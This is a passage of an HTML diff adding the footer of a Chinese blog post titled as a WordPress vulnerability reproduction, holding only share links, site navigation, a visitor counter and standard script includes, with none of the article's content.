+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&is_video=false&description=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WordPress - &#34;花咲雨町&#34;漏洞复现&body=Check out this article: http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&title=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&title=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&title=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&title=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&name=WordPress - &#34;花咲雨町&#34;漏洞复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&t=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2024-2025
+        CrispSheep
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+    <a href="https://beian.miit.gov.cn/" target="_blank"> 豫ICP备2024078046号-1</a>  
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
